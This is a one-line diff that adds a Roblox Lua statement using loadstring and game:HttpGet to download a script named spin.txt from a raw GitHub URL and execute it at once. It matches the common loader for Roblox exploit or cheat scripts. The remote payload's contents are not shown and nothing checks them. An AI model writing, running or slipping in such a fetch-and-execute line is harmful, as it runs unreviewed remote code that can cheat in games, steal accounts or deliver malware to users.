@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WillieWardo/script/refs/heads/main/spin.txt"))()
